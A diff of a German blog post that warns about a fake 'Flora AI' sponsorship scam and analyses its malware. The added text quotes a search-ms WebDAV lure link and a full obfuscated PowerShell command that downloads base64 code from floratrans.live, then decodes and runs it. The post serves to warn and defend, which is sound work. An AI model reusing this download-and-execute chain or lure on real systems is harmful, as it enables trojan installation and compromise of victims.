@@ -1,5 +1,5 @@
 ---
-title: "Flora AI oder Flop? Vorsicht vor dubiosen YouTube-Kooperationsanfragen"
+title: "Achtung: Flora-AI.org - Fake Firma versucht Trojaner zu installieren"
 params:
   author: Andy
 date: "2025-01-19"
@@ -11,7 +11,7 @@ categories:
     - "Scam"
 thumbnail: "youtube.webp"
 url: "posts/2025-01-19-flora-ai"
-summary: "1500 Dollar für 10 Sekunden? Warum bei solchen Anfragen Vorsicht geboten ist."
+summary: "1500 Dollar für 10 Sekunden? Warum bei solchen Anfragen Vorsicht geboten ist. Trojaner lauern!"
 ---
 
 Vor kurzem erreichte uns eine Kooperationsanfrage von einem angeblichen KI-Projekt namens "Flora AI". $1500 für einen 10-sekündigen Pre-Roll auf YouTube klangen verlockend – doch bei genauerem Hinsehen zeigte das Angebot einige verdächtige Details. 
@@ -110,6 +110,77 @@ Die Webseite sieht gar nicht mal so schlecht aus. Alles gut gemacht, keine toten
 
 ![Die Webseite, professionell gemacht](/posts/2025-01-19-flora-ai/ai_1.webp)
 
-Eine Anmeldung oder Nutzung ist derzeit aber nicht möglich.
+## Flora AI schreibt zurück
 
-![Anmeldung leider nicht möglich](/posts/2025-01-19-flora-ai/ai_2.webp)
+Wir bekommen eine Antwort. Wir bekommen einen Code für die Freischaltung als Sponsor. 
+
+![Anmeldung leider nicht möglich](/posts/2025-01-19-flora-ai/mail_login.webp)
+
+### Dann loggen wir uns mal ein
+
+Mit dem Code gelingt der Login. Auch hier wird professionell gearbeitet. Alles sieht schick und echt aus.
+
+![](/posts/2025-01-19-flora-ai/site_1.webp)
+
+Ab hier wird es aber schnell kriminell. Wir sollen zuerst einen Vertrag herunterladen und unterzeichnen. Dies funktioniert nur unter Windows und nur mit dem Edge-Browser. Es kommt eine Meldung, dass wir den Link mit dem Windows-Explorer öffnen sollen.
+
+![](/posts/2025-01-19-flora-ai/site_2.webp)
+
+Wir machen das in der virtuellen Maschine, aber bereits hier sollten alle Alarmglocken schrillen. Ein Download sollte niemals im Explorer geöffnet werden. Windows warnt uns sogar noch ein zweites Mal.
+
+![](/posts/2025-01-19-flora-ai/site_3.webp)
+
+Hier brechen wir ab und schauen uns an, auf was der Browser zugreifen will. Wir finden eine verdächtige Verbindung im Browserprotokoll. Im Prinzip eine Art Shortcut, welcher ein externes WebDAV-Verzeichnis im Explorer öffnen würde.
+
+![](/posts/2025-01-19-flora-ai/site_4.webp)
+
+Der komplette Link:
+
+    search-ms:query=&crumb=location:\\floratrans.live@SSL\webdav\Docs\Generated\Verification\Partner_19\Downloads\&displayname=Search
+
+Wir öffnen die WebDAV-Adresse manuell über den Explorer, hier finden wir dann eine vermeintliche PDF-Datei. Der Pfeil signalisiert aber, hey, hier ist eine .lnk Datei.
+
+![](/posts/2025-01-19-flora-ai/site_5.webp)
+
+Diese werfen wir mal in VirusTotal, was gleich zu einigen Warnungen führt.
+
+![](/posts/2025-01-19-flora-ai/site_6.webp)
+
+### Was tut die .lnk Datei?
+
+Über Rechtsklick und Eigenschaften finden wir heraus, was die Datei macht.
+
+![](/posts/2025-01-19-flora-ai/settings.webp)
+
+Der komplette Befehl:
+
+    C:\Windows\System32\conhost.exe --headless pow"ersh"el"l.exe" 
+    -WindowStyle Hidden -ExecutionPolicy Bypass -Command 
+    "&{$b=(Invoke-WebRequest 'https://floratrans.live/495/didi.txt').Content;iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))}  
+
+Schauen wir uns die Sache genauer an, sehen wir, dass hier mittels Powershell eine Datei aus dem Internet geladen werden soll. Diese wird anschließend dekodiert und ausgeführt.
+
+### Installation des Trojaners
+
+Bei genauerer Betrachtung stellt sich die vermeintliche Kooperationsanfrage als ausgeklügelter Angriff heraus. Ein bereitgestelltes Skript baut dynamisch URLs zusammen, um Dateien wie `pomoykaXL.exe` und eine angebliche PDF herunterzuladen und auszuführen. 
+
+Es legt diese Dateien im Dokumente-Ordner ab und startet sie direkt, während der Windows-Explorer gezielt beendet wird, vermutlich um Nutzeraktionen zu erschweren. 
+
+![Teil des Scriptes](/posts/2025-01-19-flora-ai/trojan_1.webp)
+
+Gleichzeitig nimmt das Skript Kontakt zu einem Server unter der Domain `floratrans.live` auf, um den Angreifern vermutlich den Erfolg zu melden. Nach fünf Minuten löscht es die schädlichen Dateien, um Spuren zu verwischen. 
+
+Dieses Vorgehen zeigt, wie wichtig es ist, verdächtige Dateien und Skripte zu prüfen und im Zweifel nicht auszuführen.
+
+## Analyse mit VirusTotal
+
+Auch eine [Überprüfung mit VirusTotal](https://ekiwi-blog.de/22006/dateien-online-auf-viren-pruefen/) lässt wenige Zweifel:
+
+![](/posts/2025-01-19-flora-ai/virustotal.webp)
+
+
+## Fazit: Aufgepasst!
+
+Die Webseite von „Flora AI“ ist auf den ersten Blick hervorragend gestaltet und vermittelt einen professionellen Eindruck, der Vertrauen wecken soll. Doch genau darin liegt die Gefahr: Eine ansprechende Optik und überzeugende Inhalte können schnell darüber hinwegtäuschen, dass es sich um einen raffinierten Betrugsversuch handelt. 
+
+Der Angriff zeigt, wie ausgeklügelt solche Maschen mittlerweile sind – von dynamisch generierten Schadskripten bis hin zu scheinbar seriösen Angeboten. Unser Tipp: Niemals blind vertrauen, auch wenn die Webseite professionell wirkt. Ein kritischer Blick und Vorsicht bei unerwarteten Anfragen können viel Ärger ersparen.
